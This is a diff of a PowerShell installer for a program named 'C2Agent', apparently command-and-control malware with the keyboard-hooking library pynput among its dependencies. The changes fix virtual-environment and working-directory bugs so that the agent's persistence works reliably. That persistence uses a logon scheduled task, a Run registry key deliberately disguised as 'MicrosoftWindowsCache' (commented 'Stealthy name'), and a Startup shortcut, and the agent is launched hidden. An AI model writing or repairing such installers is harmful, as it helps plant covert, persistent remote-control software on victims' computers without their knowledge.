@@ -185,8 +185,13 @@ while True: time.sleep(60)
     # 4. Virtual Env & Deps
     # -------------------------------------------------------------------------
     $venvPath = Join-Path $InstallPath "venv"
-    if (-not (Test-Path $venvPath)) {
+    $pyvenvCfg = Join-Path $venvPath "pyvenv.cfg"
+    if (-not (Test-Path $pyvenvCfg)) {
+        if (Test-Path $venvPath) { Remove-Item $venvPath -Recurse -Force -ErrorAction SilentlyContinue }
         & $pythonPath -m venv $venvPath | Out-Null
+    }
+    if (-not (Test-Path $pyvenvCfg)) {
+        throw "Venv creation failed: pyvenv.cfg missing"
     }
     
     $venvPython = Join-Path $venvPath "Scripts\python.exe"
@@ -204,7 +209,8 @@ pynput>=1.7.0
     # 5. Scheduled Task / Persistence
     # -------------------------------------------------------------------------
     $taskName = "C2Agent"
-    $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $InstallPath
+    # Use venv as WorkingDirectory so Python Launcher finds pyvenv.cfg (agent uses __file__ for paths)
+    $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $venvPath
     $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
     
     if ($Mode -eq "Admin") {
@@ -217,7 +223,8 @@ pynput>=1.7.0
         Start-Sleep -Seconds 2
         Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
         # Also launch agent directly so it runs immediately (task may not run until next logon on some systems)
-        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $InstallPath -WindowStyle Hidden
+        # Use venv as CWD so Python Launcher finds pyvenv.cfg (avoids "No pyvenv.cfg file" error)
+        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $venvPath -WindowStyle Hidden
         # Let the process fork and detach before installer exits
         Start-Sleep -Seconds 3
     } else {
@@ -225,8 +232,8 @@ pynput>=1.7.0
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $name = "MicrosoftWindowsCache" # Stealthy name
         
-        # Command: Use pythonw to run silently
-        $cmd = "`"$venvPythonw`" `"$agentPyPath`""
+        # Command: cd to venv so Python Launcher finds pyvenv.cfg, then run pythonw with agent
+        $cmd = "cmd /c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
         
         try {
             Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
@@ -235,15 +242,15 @@ pynput>=1.7.0
             $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
             $wsh = New-Object -ComObject WScript.Shell
             $sh = $wsh.CreateShortcut($shortcutPath)
-            $sh.TargetPath = $venvPythonw
-            $sh.Arguments = "`"$agentPyPath`""
+            $sh.TargetPath = "cmd.exe"
+            $sh.Arguments = "/c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
             $sh.WindowStyle = 7 # Minimized
             $sh.Save()
         }
         # Brief delay so registry/filesystem are settled before launching
         Start-Sleep -Seconds 2
-        # Start immediately with correct working directory (matches task behavior)
-        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $InstallPath -WindowStyle Hidden
+        # Start immediately; use venv as CWD so Python Launcher finds pyvenv.cfg (avoids "No pyvenv.cfg file" error)
+        Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" -WorkingDirectory $venvPath -WindowStyle Hidden
         # Let the process fork and detach before installer exits
         Start-Sleep -Seconds 3
     }
